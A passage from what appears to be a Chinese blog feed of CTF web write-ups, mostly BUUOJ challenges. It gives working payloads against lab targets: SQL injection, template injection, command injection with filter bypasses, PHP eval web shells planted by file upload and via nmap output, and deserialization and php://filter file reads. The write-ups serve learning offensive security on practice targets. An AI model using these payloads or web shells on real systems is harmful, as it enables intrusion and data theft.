class="string">&quot;password&quot;</span> =&gt; <span class="variable">$result</span> . chr(<span class="variable">$j</span>) . <span class="variable">$p</span>, <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;yu22x&quot;</span>);</span><br><span class="line">        <span class="variable">$postData</span> = http_build_query(<span class="variable">$postData</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_POSTFIELDS, <span class="variable">$postData</span>);</span><br><span class="line">        <span class="variable">$outcontent</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>,CURLINFO_HTTP_CODE);</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line">        printf(<span class="string">&quot;Now j is %d,string is %s\n&quot;</span>,<span class="variable">$j</span>,<span class="variable">$result</span> . chr(<span class="variable">$j</span>) . <span class="variable">$p</span>);</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$outcontent</span>,<span class="string">&quot;I have filtered all the characters. Why can you come in? get out!&quot;</span>) || <span class="variable">$httpCode</span> == <span class="number">302</span>)&#123;</span><br><span class="line">            <span class="variable">$result</span> .= chr(<span class="variable">$j</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以得到密码为 <code>67815b0c009ee970fe4014abaa3Fa6A0</code>。</p><p><strong>New Section</strong><br>使用环境变量截取出 <code>nl ????.???</code> 的指令读取 <code>flag.php</code>。</p><blockquote><p>1.1.1.1;${PATH:14:1}<n>$</n>{PATH:5:1} ????.???</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BUUOJ Web 一分题 WriteUp 合集</title>
      <link href="/zh-CN/posts/d24ddcdc.html"/>
      <url>/zh-CN/posts/d24ddcdc.html</url>
      
        <content type="html"><![CDATA[<p>想了很久怎么给自己一点刷题动力，感觉得靠兴趣驱使。再加上有点想垂直上分，也增加一点技术力，所以就开了这波实时更新的小合集。有一部分的环境会尝试自己去搭建。（想改善一下玩 Docker 的技术力，而且也想收集一下题目原本很好玩的 flag）还有部分题目会被单独分离出来（譬如咱打过的比赛啥的），所以并不完整，嘿嘿。</p><h3 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h3><p>首先分别点进提供的三个页面，收集一波 hint，可以得到 <code>md5(cookie_secret+md5(filename))</code> <code>flag in /fllllllllllllag</code> 这两个提示，还有一个 <code>render</code>。因为提示了是 tornado 的模板注入，但是接触得比较少，于是就查了一下，找到了这样的内容。</p><blockquote><p>在tornado模板中，存在一些可以访问的快速对象，例如 {{ escape(handler.settings["cookie"]) }}</p><p>handler 指向 RequestHandler</p><p>而 RequestHandler.settings 又指向 self.application.settings</p><p>所有 handler.settings 就指向 RequestHandler.application.settings 了！</p></blockquote><p>但是目前是没有利用点的。这个时候，把题目的 GET 参数一通乱改之后出现了一个报错页面。欸，好机会！构造了一个 <code>error?msg=&#123;&#123;7*'7'&#125;&#125;</code> 结果返回了 ORZ。基本上确定是利用点了，但是我还是想确定一下，于是构造了 <code>error?msg=&#123;&#123;~1&#125;&#125;</code>，得到了 -2 的反馈，于是得以确认。根据上面查到的结果，构造 <code>error?msg=&#123;&#123;handler.settings&#125;&#125;</code> 得到 <code>cookie_secret</code> 为 <code>cae74968-3bf4-4be4-8505-e2db1c865c15</code>。根据上面的 hint 构造 <code>filename=/fllllllllllllag&amp;filehash=6740f481f040fa14e844929205445908</code> 即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f69df34c-c28c-4aa9-9bfe-7e73f9e61690&#125;</span><br></pre></td></tr></table></figure><h3 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h3><p>首先看了一波源码，找到 source.php 然后 source 可读，其中还有个 hint.php。于是去看 hint.php，得到了一个提示 <code>flag not here, and flag in ffffllllaaaagggg</code>。这里有一个点，因为一开始的构造决定了前两个检验必不可能 true，因此只能看后面 url 解码之后的校验，那就要保证构造能安全地通过这两个地方而不被截断。因为源码会不断地尝试截取问号前面的内容（当没有问号就在最后接一个问号然后截断，也就是相当于没有截断），因此只要在 <code>source.php</code> 后面编码一个问号 <code>%3f</code>，就能达成在解码后再截断的目的，从而可以通过 <code>in_array($_page, $whitelist)</code> 的检验从而返回 true。接下来就是目录穿越一波，构造 <code>?file=source.php?/../../../../../../ffffllllaaaagggg</code> 得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hctf&#123;e8a73a09cfdd1c9a11cca29b2bf9796f&#125;</span><br></pre></td></tr></table></figure><h3 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h3><p>既然是随便注嘛，上手试试看 <code>1&#39;#</code> 发现显示是正常的，于是进一步构造 <code>1&#39; union select 1,2,3 #</code> 然后就被 <code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code> 挡下来了。因为没得 <code>select</code> 了，查了一下，堆叠注入比较靠谱，于是构造一波 <code>1&#39;;show databases;#</code> 得到了正确的反馈。于是 <code>1&#39;;show tables;#</code>，看到了一个很可疑的表 <code>1919810931114514</code>。用 <code>1&#39;;desc `1919810931114514`;#</code> 查一波这个表的结构可以发现 flag 的字段。</p><p>关键在于如何去读取它，查了一波之后发现可以悄悄地把表换掉，于是打出一套组合操作。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RENAME TABLE &#96;words&#96; TO &#96;wordstmp&#96;;</span><br><span class="line">RENAME TABLE &#96;1919810931114514&#96; TO &#96;words&#96;;</span><br><span class="line">ALTER TABLE &#96;words&#96; CHANGE &#96;flag&#96; &#96;id&#96; VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;</span><br></pre></td></tr></table></figure><p>这样之后，默认所查的 words 表就变成了包含 flag 的表，这个时候随便构造个 <code>1&#39; or 1=1#</code>一读就能拿到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d2d32fa6-a7b4-44d0-8648-71ae2f1d1353&#125;</span><br></pre></td></tr></table></figure><h3 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h3><p>氦，这题我是真的写不出来，查了一波发现很多师傅说这题可以查到源码，但是我怎么扫都扫不出QAQ。对照着看了一波，发现需要把原本的 <code>||</code> 安排掉。这点使用 <code>PIPES_AS_CONCAT</code> 可以达成，于是构造 <code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code> 成功拿到 flag。</p><p>源码中的 sql 语句是 <code>$sql = &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;;</code>，构造之后就变成了三句语句。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">set</span> sql_mode<span class="operator">=</span>PIPES_AS_CONCAT;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">1</span>,flag <span class="keyword">from</span> flag;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUCTF&#123;SUCTF_baby_sql_chall_120993n810h3&#125;</span><br></pre></td></tr></table></figure><h3 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h3><p>这题在修改密码的页面给了个注释 hint，定向到 GitHub，上面有题目的源码。好奇的我看了一波同用户的其他 repo，找到了这题的环境，然后在 readme 看到了考点，于是顺着一找，找到了 <a href="http://sunsec.top/2018/11/15/HCTF%20admin/">这篇文章</a>。于是就注册一波 <code>ᴬᴰᴹᴵᴺ</code> 然后登录再修改密码，再用 <code>admin</code> 和修改的密码登录即可得到 flag。</p><p>关于对于 Unicode 字符的生成可以参考 <a href="https://unicode-table.com/en/1D2C/">这个页面</a>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hctf&#123;un1cOdE_cHe4t_1s_FuNnying&#125;</span><br></pre></td></tr></table></figure><h3 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h3><p>首先随便算一个数，然后看看请求，发现请求给了 calc.php。尝试直接访问，发现源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用点就是最后的 <code>eval()</code>。这波没给引号，于是有两种方案：使用 <code>chr()</code> 配合 ASCII 来构造，或者使用 hex 和按位取反来构造（这个是后来看<a href="http://www.pdsdt.lovepdsdt.com/index.php/2019/10/15/2019_roarctf-writeup-ginkgo/#0x01_easy_calc">这个题解</a>的时候学到的。但是构造成 <code>?num=1;var_dump(scandir(chr(47)));</code> 之后 403 了。于是返回去看，发现首页源码中提了一句 WAF。于是顺手查了一波，发现可以使用一个空格去绕过。于是构造 <code>?%20num=1;var_dump(scandir(chr(47)));</code>，成功得到反馈。得到 <code>f1agg</code> 的线索。于是接下来构造 <code>?%20num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)));</code> 来读取这个文件，成功得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d7899aa0-16b1-4752-95f5-b9c5037caffa&#125;</span><br></pre></td></tr></table></figure><h3 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h3><p>啊，是看起来很熟悉的上传文件。老套路，构造好之后上传再用蚁剑连接就行。这里有一个要点，就是使用 .user.ini 来实现加载 php 文件之前加载一个指定的文件。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#.user.ini</span></span><br><span class="line"><span class="comment">#define width 10</span></span><br><span class="line"><span class="comment">#define height 10</span></span><br><span class="line"><span class="attr">auto_prepend_file</span>=flag.jpg <span class="comment">#append for after </span></span><br></pre></td></tr></table></figure><p>在 flag.jpg 里写上一句话。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag.jpg</span></span><br><span class="line">GIF89a?</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>上传之后根据反馈可以知道 index.php 文件也与上传的文件位于一个目录下，因此只需要访问 index.php 即可达到目的。于是蚁剑访问 <code>.../uploads/48cd8b43081896fbd0931d204f947663/index.php</code> 然后打开文件管理即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUCTF&#123;U5er_1n1_01d_TR1ck&#125;</span><br></pre></td></tr></table></figure><h3 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h3><p>这题，稍微试了一下之后发现是盲注，找了一下真和假的标记，掏出之前的二分模板，构造 <code>$sql = &quot;(ascii(substr((select(flag)from(flag)),&quot; . $i . &quot;,1))&gt;&quot; . $_mid . &quot;)^0&quot;;</code>  一顿怼，就能跑出 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f6bbbf99-0f93-4687-b2a4-5afc16dab5f5&#125;</span><br></pre></td></tr></table></figure><h3 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h3><p>首先上来一顿操作之后发现了 <code>/view.php?no=1</code> 这个注入利用点，一顿操作之后会发现 flag 根本不在数据库里，反而是一段序列化的字符串存在 <code>data</code> 字段。毕竟是网鼎杯，当然没有那么简单。尝试几下没有反馈之后查了一下，发现这题是有源码泄露的，于是下载下来。很容易发现是个反序列化，但是它有点不一样，但是主要的利用点在 <code>blog</code> 这个字段。当时的我并不知道要读啥文件，后来看了很多文章，有师傅说能扫出 flag.php。<span class="heimu" title="我太菜了">我还是太菜了</span></p><p>于是这里就能接着往下构造了，我随便序列化了一下，得到了 <code>O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;lemon&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;</code>，然后就是接着注入啦。按照一般套路，先构造 <code>select/**/1,2,3,4</code> 看看回显在哪里，然后可以看到在 2 的地方。然后就是想办法使回显按照我们序列化的字段来。因此，只需要构造 <code>.../view.php?no=2333/**/union/**/select/**/1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;lemon&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#39; /**/from/**/users%23</code>。这样页面就会尝试读取 flag.php。然后查看页面源码，然后 base64 解码即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;9e34256a-b20b-4776-86d0-bbebd2aecd02&#125;</span><br></pre></td></tr></table></figure><h3 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h3><p>这题首先就给了源码，复制下来仔细地整理（这里我就不贴了，占版面，网上一搜就有）。首先因为定义了 <code>waf()</code> 导致不能使用 <code>gopher</code> 和 <code>file</code>。但这同时也给了我们一个指向性信息，结合 hint 可知我们需要做的是读取文件 flag.txt。</p><p>不难发现向 <code>/Delta</code> 发送请求最后可以执行到 <code>Exec()</code> 从而读文件。因此需要三个参数，准确地来说有两个是 Cookie。接下来看 <code>Exec()</code>，要读取文件并输出的话需要在参数 <code>action</code> 中包含 <code>read</code> 和 <code>scan</code>。于是构造 <code>action=readscan</code>。<code>param</code> 自然就是 <code>flag.txt</code>。接下来就是解决 <code>sign</code> 的环节。</p><p>题目给出了一个路由 <code>/geneSign</code> 用来生成 <code>sign</code>，需要的是 <code>action</code> 和 <code>param</code>，但是这里的 <code>action</code> 被固定了，不好下手。跟着代码来到 <code>getSign()</code>，发现了拼接 <code>secert_key + param + action</code>，于是只要把原本请求里的 <code>param</code> 构造成 <code>flag.txtread</code> 就能生成对应的可用 <code>sign</code> 了。</p><p>将生成的 <code>sign</code> 跟上述的两个参数一起以对应的形式向 <code>/Delta</code> 发起请求即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4b706878-1516-4a40-9aea-1f393a4b1650&#125;</span><br></pre></td></tr></table></figure><h3 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h3><p>按照很简洁的提示 <code>/?ip=</code> 试了一波，发现加上分号之后可以执行更多命令。于是试了一波 <code>ls</code>，发现了 flag.php，只要想办法读它就行了。试了一下之后发现 flag 和 空格都被 ban 了。于是查了一波，发现 <code>$IFS$2</code> 可以用来代替空格。加上可以使用变量来代替 flag 里的一部分字符，就可以构造出 <code>o=g;cat$IFS$2fla$o.php</code>。发送请求之后查看网页源码即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GXY(1_sh0uld_ban_Icmp_4tFirst)</span><br></pre></td></tr></table></figure><h3 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h3><p>开局一段代码，都是老套路，构造 <code>text=data://text/plain,welcome to the zjctf</code> 过掉判断，然后再构造 <code>file=php://filter/convert.base64-encode/resource=useless.php</code> 读取一下 useless.php。Base64 解码之后得到 useless.php。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p>这波挺简单，放到 IDE 里随便序列化一下，得到 <code>O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:52:&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;&#125;</code> 之后放进参数 <code>password</code> 里。然后发起请求（x <span class="heimu" title="真是的，细心一点嘛">这里不对呐~</span></p><p>因为还要加载 useless.php 反序列化才能起效果，所以要修改原来 php 伪协议的构造，最后构造出 <code>.../?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:52:&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;&#125;</code> 得到一串 base64 字符串，解码后得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;8e991b07-be12-4339-9fbc-e895b87b9bc2&#125;</span><br></pre></td></tr></table></figure><h3 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h3><p>这波是简单题，看一下 url 之后构造简单的文件包含 <code>.../?file=php://filter/convert.base64-encode/resource=flag.php</code>。将内容 base64 解码后得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;39ad315b-01ff-4d4e-9560-635a28d81a17&#125;</span><br></pre></td></tr></table></figure><h3 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h3><p>这波也是简单题，直接一个 <code>&amp;</code> 连接命令,构造 <code>114.114.114.114 &amp; cat /flag</code>，就能输出 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3cb2f161-aed1-423f-9eed-c93fa2fc2328&#125;</span><br></pre></td></tr></table></figure><h3 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h3><p>本来准备留到后面写这题的，但是跟<a href="https://duitutu.cn">堆堆</a>讨论的时候他跟我透露了是源码泄露，所以干脆就先写一写。既然标题是 Easy Java，加上拿到的资料，在看到题目给出的 help 的 url 之后果断构造下载一波 <code>WEB-INF/web.xml</code>。不过仍然遇到了点问题，需要使用 POST 请求才能下载到文件。下载下来之后发现有一个 <code>com.wm.ctf.FlagController</code>，于是再构造一波 <code>WEB-INF/classes/com/wm/ctf/FlagController.class</code> 来下载这个文件。下载之后打开来我一时懵了，毕竟是编译过的东西，所以看起来乱七八糟，愣是没发现有段 base64。不过问题不大，把 base64 字符串解码之后就是 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;db7dab97-1cd7-48ad-b991-66ec0c3dc816&#125;</span><br></pre></td></tr></table></figure><h3 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h3><p>啊，这题开门见山，给了一段代码，一看就不简单（bushi）。稍微一看就知道，传入一个参数，两道过滤之后执行，利用点肯定在 <code>nmap</code> 指令。于是就去查一波这个指令的手册，可以看到这样一条允许我们直接写如文件的参数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-oN&#x2F;-oX&#x2F;-oS&#x2F;-oG &lt;file&gt;: Output scan in normal, XML, s|&lt;rIpt kIddi3,and Grepable format, respectively, to the given filename.</span><br></pre></td></tr></table></figure><p>同时 <code>sandbox</code> 的路径会在成功之后输出。因此，想办法写入一句话然后用蚁剑去连上就行啦。</p><p>先来看看 <code>nmap</code>，使用上面的那个参数，构造 <code>nmap -T5 -sT -Pn --host-timeout 2 -F &#39;&lt;?php eval($_POST[&quot;pick&quot;]);?&gt;&#39; -oG pick.php</code> 尝试，得到一个 pick.php 文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.80 scan initiated Tue Apr 28 01:07:48 2020 as: nmap -T5 -sT -Pn --host-timeout 2 -F -oG pick.php &quot;&lt;?php eval($_POST[&quot;pick&quot;]);?&gt;&quot;</span></span><br><span class="line"><span class="comment"># Nmap done at Tue Apr 28 01:07:48 2020 -- 0 IP addresses (0 hosts up) scanned in 0.07 seconds</span></span><br></pre></td></tr></table></figure><p>可以发现语句已经完整地写入进去了。再看过滤的那两个函数，根据 PHP 手册的说明，<code>escapeshellarg()</code> 这个函数会转义所有引号然后用引号包起来，同时在字符串两端加上引号。<code>escapeshellcmd()</code> 会在部分字符前加上 <code>\</code>。<span class="HighlightWKT7BlueGreen">（在 Windows 下会有所不同，建议使用 Linux 环境尝试。）</span>因此，先假定整个 payload 为 <code>A</code>，正常来说它会被 <code>escapeshellarg()</code> 变成 <code>&#39;A&#39;</code>。如果我们在 <code>A</code> 前后再加上一个单引号，就会变成 <code>&#39;&#39;\&#39;&#39;A&#39;\&#39;&#39;&#39;</code>，这个时候因为有反斜杠转义，所以这个 payload 还是不太对。但是 <code>escapeshellcmd()</code> 的出现是一个助攻，它会在反斜杠前加个反斜杠转义，那 payload 就成了 <code>&#39;&#39;\\&#39;&#39;A&#39;\\&#39;&#39;&#39;</code>，这个时候，所有引号闭合，A 暴露在语句中，执行写入就成功了。用蚁剑连上去即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2fba51b2-2f0b-42b4-ac84-144f7c7b39e3&#125;</span><br></pre></td></tr></table></figure><h3 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h3><p>这题首先提示备份和 <code>source file</code>，略微找一下不难找到（实在找不到就扫描器嘛）index.php.bak。审计一波可以发现 <code>$key = intval($key);</code> 把 <code>$key</code> 坐实成整数了，然后把整数和字符串相比，那字符串就会被截断了，所以这个地方的 <code>$str</code> 最后是 123。所以，只需要使传入的参数值为 123 即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;30d4e82b-b8b5-42ea-aaec-fb00ad067bad&#125;</span><br></pre></td></tr></table></figure><h3 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h3><p>这题不知道为啥，上来报了个错。（写完了题目之后发现并没有用  一顿倒腾之后可以发现 robots.txt 的存在，然后根据线索访问到 fAke_f1agggg.php。这个页面一定有线索，排查之后发现响应里有 <code>Look_at_me: /fl4g.php</code>，访问一波，来到了最后亿步的页面。</p><p>首先是 <code>intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021</code> 这个点，查了一波之后发现了神奇操作，<code>intval</code> 的返回值在大于 2147483647 之后会变得奇奇怪怪，试了一波，以字符串传入科学计数法也会被截断，但是当加上一个数字之后又正常了，所以，整个 <code>1e4</code> 构造一句 <code>echo (intval(&quot;1e4&quot;) &lt; 2020 &amp;&amp; intval(&quot;1e4&quot; + 1) &gt; 2021)?&quot;true&quot;:&quot;false&quot;;</code> 试试看，很巧的是在 php 5.6 下，这句会返回 <code>true</code> 而 php 7.2 下返回的是 false。原因是 <code>intval(&quot;1e4&quot;)</code> 在 php 7.2 下不会再被截断而正常转化。</p><p>接着的点是 <code>$md5==md5($md5)</code>，这就很有意思了，好在它是个弱比较，于是很容易想到用科学计数法的套路，于是写个脚本跑一下（期间的时间足够泡完一杯咖啡再喝上两口），找到 <code>0e215962017</code> 的 MD5 也以 0e 开头，于是这个点达成。</p><p>最后是两个小点，空格的过滤用 <code>$IFS$2</code> 绕过，<code>cat</code> 不给用就用 <code>tac</code>。但是，在这之前得先读个目录，毕竟题目没说 flag 在哪。于是首先构造 <code>.../fl4g.php?num=1e4&amp;md5=0e215962017&amp;get_flag=ls</code> 得到 flag 所在，然后再构造 <code>/fl4g.php?num=1e4&amp;md5=0e215962017&amp;get_flag=tac$IFS$2fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code> 得到 